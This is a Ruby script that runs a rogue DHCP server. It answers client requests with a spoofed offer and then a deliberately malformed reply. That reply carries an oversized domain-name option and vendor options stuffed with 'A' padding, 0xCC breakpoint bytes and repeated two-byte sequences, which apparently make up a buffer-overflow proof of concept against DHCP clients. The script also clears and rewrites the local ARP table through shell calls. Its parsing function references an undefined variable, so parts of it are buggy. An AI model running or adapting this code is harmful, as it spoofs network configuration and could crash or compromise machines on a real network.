#!ruby

require 'socket'

$port = 67 
$magic =  "\x63\x82\x53\x63"
$serverip = '10.50.0.116'

def respond(message = 'test', dstip = '255.255.255.255')
	warn "sending response"
	s = UDPSocket.open
	s.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, 1)
	s.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
	s.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEPORT, true)
	s.bind('<any>', 68)
	s.send(message, 0, dstip, 67)
	p message.unpack('H*')[0].upcase
end

def packip (ip)
	return ip.split('.').collect { |i| i.to_i }.pack('CCCC')
end

def packmac (mac)
	return mac.split(':').pack('H2H2H2H2H2H2')
end

def parse (request)
	if request.length < 236
		return 
	end
		
	transaction = request[4..8].unpack('N')[0]
	mac = request[28..33].unpack('H2H2H2H2H2H2').join(':')
	ip = '10.50.0.136'

	begin
		ip = request[246+ a[246..-1].index("\x32\x04")+2,4].unpack('C*')
	rescue
	end
	return [transaction, mac, ip]
end

def encode (type, value)
	if (value.length > 255)
		raise "invalid option"
	end

	return [type, value.length].pack('CC') + value
end

def offer ( transaction, mac, ip = '10.10.10.12' )

	packet = 
		"\x02\x01\x06\x00" + #Preamble
		[transaction, 0 ].pack('NN') + #  transaction + flags

		packip('0.0.0.0') + 		# client ip
		packip(ip) + 				# server ip
		packip('172.16.16.1') + 	# next server IP
		packip('0.0.0.0') + 		# relay agent IP

		packmac(mac) + #Client MAC
		"\x00" * 10 + # chaddr padding
		"\x00" * (16 * 4) + # server hostname
		"\x00" * (16 * 8) + # boot filename
		$magic + 					# magic cookie
		encode(0x35, "\x02") + 				# message type
		encode(0x36, packip($serverip)) + 	# Serevr identifier
		encode(0x33, "\x00\x00\xa8\xc0") + 	# IP lease time
		encode(0x01, "\xFF\xFF\x00\x00") + 	# subnet mask
		encode(0x0f, "metasploit.com") +  	# domain name
		encode(0x03, packip($serverip)) + 	# router IP
		encode(0x06, packip($serverip) + packip($serverip)) + # DNS (2 dns servers)
		encode(0x2c, packip($serverip)) +	# netbios name server
		encode(0x2e, "\x08") +				# node type
		"\xff"								# no more options
end

def request ( transaction, mac, ip = '10.10.10.12' )
	packet =
		"\x02\x01\x06\x00" + #Preamble
		[transaction, 0 ].pack('NN') + #  transaction + flags

		packip('0.0.0.0')	+ 	# client IP

		packip(ip)			+ 	# Server IP
		packip($serverip)	+  	# next server IP
		packip('0.0.0.0')	+ 	# relay agent IP

		packmac(mac) + 				# client MAC address
		"\x00" * 10 + 				# chaddr padding
		"\x00" * (16 * 4) + 		# server hostname
		"\x00" * (16 * 8) + 		# boot filename
		$magic + 					# magic cookie
	
		encode(0x35, "\x05") + 
		encode(0x36, packip($serverip)) + 					# server identifier
		encode(0x33, "\x00\x00\xa8\xc0") +					# lease time
		encode(0x01, packip('255.255.0.0')) + 				# subnet 
		encode(0x03, packip($serverip)) + 					# router IP
		encode(0x06, packip($serverip) + packip($serverip)) + # DNS SERVER
		encode(0x2c, packip('10.1.1.100')) +				# netbios name server
		encode(0x2e, "\x08") + 

		encode(0x0f, "AB" + "A" * 0xfd) +
		encode(0xfa,  ("A" * 0x8f) + ("\xcc" * 0x70)) +
		encode(0xfa, "\xCC" * 0xff) + 
		encode(0xfa, "\xCC" * 0xff) + 
		encode(0xfa, ("\x01\x0B" * 0x7f) + "\x00")+
		"\xff"
end

system("arp -da")
sThread = Thread.start do     # run server in a thread
	server = UDPSocket.open
	server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
	server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEPORT, true)
	server.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, 1)
	server.bind('<any>', $port)
	while (1)
		request = server.recvfrom(1024)
		(transaction, mac, ip) = parse(request[0])
		p ip
		if !transaction.nil?
			p 'here1'
			p mac
			#			if mac == "00:0c:29:d6:d1:62"
				p 'here2'
				system("echo arp -s #{ip} #{mac}")
				system("arp -s #{ip} #{mac}")
				respond(offer(transaction, mac, ip), ip)
				sleep(1)
				respond(request(transaction, mac, ip), ip)
				#			else
				#p "not right mac!"
				#end
		else
			p "not dhcp"
		end
	end
end

respond()
respond()

sThread.join
